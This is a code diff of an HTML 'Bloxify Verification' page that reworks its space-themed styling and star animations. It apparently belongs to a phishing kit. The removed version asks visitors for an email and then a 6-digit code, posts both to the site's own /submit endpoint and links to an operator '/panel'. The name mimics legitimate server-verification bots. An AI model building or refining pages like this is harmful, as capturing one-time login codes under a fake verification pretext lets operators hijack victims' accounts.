@@ -1,139 +1,181 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <title>Bloxify Verification</title>
+
 <style>
 html, body {
     margin: 0;
-    padding: 0;
-    width: 100%; height: 100%;
-    background: black;
-    font-family: Arial;
+    width: 100%;
+    height: 100%;
     overflow: hidden;
-    color: #eee;
+    background: #000;
+    font-family: Arial, sans-serif;
+    color: white;
 }
 
-/* Floating starfield */
+/* ===== FLOWING SPACE BACKGROUND ===== */
 #space {
     position: fixed;
-    width: 200%;
-    height: 200%;
-    background: radial-gradient(white 1px, transparent 1px);
-    background-size: 100px 100px;
-    animation: drift 120s linear infinite;
+    inset: -50%;
+    background:
+        radial-gradient(circle at 30% 30%, #222 0%, transparent 40%),
+        radial-gradient(circle at 70% 60%, #1a1a1a 0%, transparent 45%),
+        linear-gradient(120deg, #000, #111, #000);
+    animation: wave 25s ease-in-out infinite alternate;
+    z-index: 0;
 }
 
-@keyframes drift {
-    0% { transform: translate(0,0); }
-    100% { transform: translate(-400px,-400px); }
+@keyframes wave {
+    0% { transform: translate(0, 0) scale(1); }
+    100% { transform: translate(-4%, -6%) scale(1.1); }
 }
 
-/* UI Box */
-#box {
+/* ===== STARS ===== */
+.star {
+    position: absolute;
+    width: 6px;
+    height: 6px;
+    background: white;
+    border-radius: 50%;
+    box-shadow: 0 0 10px rgba(255,255,255,0.8);
+    cursor: pointer;
+    z-index: 1;
+}
+
+/* ===== CENTER UI ===== */
+#ui {
     position: absolute;
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    width: 400px;
+    width: 420px;
     padding: 35px;
-    background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
-    border-radius: 16px;
+    background: linear-gradient(145deg, #050505, #0e0e0e);
+    border-radius: 18px;
+    box-shadow:
+        0 0 30px rgba(255,255,255,0.15),
+        inset 0 0 20px rgba(255,255,255,0.05);
     text-align: center;
-    box-shadow: 0 0 25px rgba(255,255,255,0.15);
-    z-index: 10;
+    z-index: 5;
+    animation: floatUI 6s ease-in-out infinite;
 }
 
-/* Inputs */
-input, button {
+@keyframes floatUI {
+    50% { transform: translate(-50%, -55%); }
+}
+
+h1 {
+    margin: 0;
+    font-size: 32px;
+    letter-spacing: 1px;
+}
+
+p {
+    color: #aaa;
+    font-size: 14px;
+    margin-top: 8px;
+}
+
+input {
+    margin-top: 20px;
     width: 100%;
-    padding: 12px;
-    margin-top: 12px;
-    border-radius: 8px;
+    padding: 14px;
+    background: #111;
     border: none;
+    border-radius: 10px;
+    color: white;
     font-size: 16px;
+    outline: none;
+    box-shadow: inset 0 0 10px rgba(255,255,255,0.05);
 }
 
-input { background: #222; color: white; }
-button { background: #333; color: white; cursor: pointer; }
-button:hover { background: #444; }
+button {
+    margin-top: 15px;
+    width: 100%;
+    padding: 14px;
+    background: #1a1a1a;
+    border: none;
+    border-radius: 10px;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+}
 
-#codeBox { display: none; }
-#error { color: #ff6b6b; display: none; }
-
-a { color: #777; text-decoration: none; }
+button:hover {
+    background: #222;
+}
 </style>
 </head>
+
 <body>
 
 <div id="space"></div>
 
-<div id="box">
-    <h1>Bloxify Verification</h1>
-    <input id="email" placeholder="Email">
-    <button onclick="sendEmail()">Submit</button>
+<div id="ui">
+    <h1>Bloxify</h1>
+    <p>Bloxify new-ish verification system ready to protect your servers!</p>
 
-    <div id="codeBox">
-        <input id="code" maxlength="6" placeholder="6-digit code" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-        <button onclick="sendCode()">Verify</button>
-        <p id="error">Verification failed, try again</p>
-    </div>
-
-    <br>
-    <a href="/panel">Panel</a>
+    <input id="email" placeholder="Enter your email">
+    <button onclick="submitEmail()">Verify</button>
 </div>
 
 <script>
-// Extra small stars for floating background
-const starCount = 200;
-for (let i = 0; i < starCount; i++) {
-    const s = document.createElement("div");
-    s.className = "star";
-    s.style.width = `${Math.random() * 2 + 1}px`;
-    s.style.height = s.style.width;
-    s.style.position = "absolute";
-    s.style.background = "white";
-    s.style.borderRadius = "50%";
-    s.style.left = `${Math.random() * window.innerWidth}px`;
-    s.style.top = `${Math.random() * window.innerHeight}px`;
-    s.style.opacity = Math.random();
-    s.style.boxShadow = "0 0 2px white";
-    document.body.appendChild(s);
+/* ===== CREATE FLOATING STARS ===== */
+const STAR_COUNT = 80;
 
-    // Animate each star slowly in a drift pattern
-    const speed = Math.random() * 0.2 + 0.05;
-    function animateStar() {
-        let x = parseFloat(s.style.left) - speed;
-        let y = parseFloat(s.style.top);
-        if (x < 0) x = window.innerWidth;
-        s.style.left = x + "px";
-        s.style.top = y + "px";
-        requestAnimationFrame(animateStar);
+for (let i = 0; i < STAR_COUNT; i++) {
+    const star = document.createElement("div");
+    star.className = "star";
+    star.style.left = Math.random() * innerWidth + "px";
+    star.style.top = Math.random() * innerHeight + "px";
+
+    let vx = (Math.random() - 0.5) * 0.3;
+    let vy = (Math.random() - 0.5) * 0.3;
+
+    function move() {
+        let x = parseFloat(star.style.left) + vx;
+        let y = parseFloat(star.style.top) + vy;
+
+        if (x < 0 || x > innerWidth) vx *= -1;
+        if (y < 0 || y > innerHeight) vy *= -1;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        requestAnimationFrame(move);
     }
-    animateStar();
+    move();
+
+    star.onclick = () => {
+        star.animate([
+            { transform: "translate(0,0)", opacity: 1 },
+            {
+                transform: `translate(${(Math.random()-0.5)*600}px, ${(Math.random()-0.5)*600}px)`,
+                opacity: 0
+            }
+        ], { duration: 700, easing: "ease-out" });
+
+        setTimeout(() => {
+            star.style.left = Math.random() * innerWidth + "px";
+            star.style.top = Math.random() * innerHeight + "px";
+            star.style.opacity = 1;
+        }, 700);
+    };
+
+    document.body.appendChild(star);
 }
 
-// Submit email
-function sendEmail() {
+/* ===== SEND EMAIL TO BACKEND ===== */
+function submitEmail() {
     fetch("/submit", {
         method: "POST",
-        headers: {"Content-Type":"application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email: email.value })
-    });
-    document.getElementById("codeBox").style.display = "block";
-}
-
-// Submit code
-function sendCode() {
-    fetch("/submit", {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({ email: email.value, code: code.value })
-    }).then(r => {
-        if (!r.ok) document.getElementById("error").style.display = "block";
-        else alert("Verification complete");
     });
 }
 </script>
+
 </body>
 </html>
